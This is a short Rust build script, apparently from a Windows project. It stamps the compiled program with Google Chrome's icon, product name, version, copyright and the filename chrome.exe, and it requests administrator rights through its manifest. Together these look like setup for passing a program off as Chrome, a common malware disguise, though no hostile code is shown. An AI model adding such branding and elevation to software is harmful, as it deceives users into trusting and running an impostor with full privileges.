#[cfg(windows)]
extern crate winres;

#[cfg(windows)]
fn main() {
    // 初始化资源
    let mut res = winres::WindowsResource::new();
    // 设置图标和描述信息
    res.set_icon("icons/chrome.ico");
    res.set("FileVersion", "104.0.5112.81");
    res.set("FileDescription", "Google Chrome");
    res.set("ProductName", "Google Chrome");
    res.set("ProductVersion", "104.0.5112.81");
    res.set("LegalCopyright", "Copyright 2022 Google LLC. All rights reserved.");
    res.set("OriginalFilename", "chrome.exe");
    // 设置权限描述
    res.set_manifest(r#"
    <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
    </assembly>
    "#);
    res.compile().unwrap();
}

// unix操作系统
#[cfg(not(windows))]
fn main() {
    
}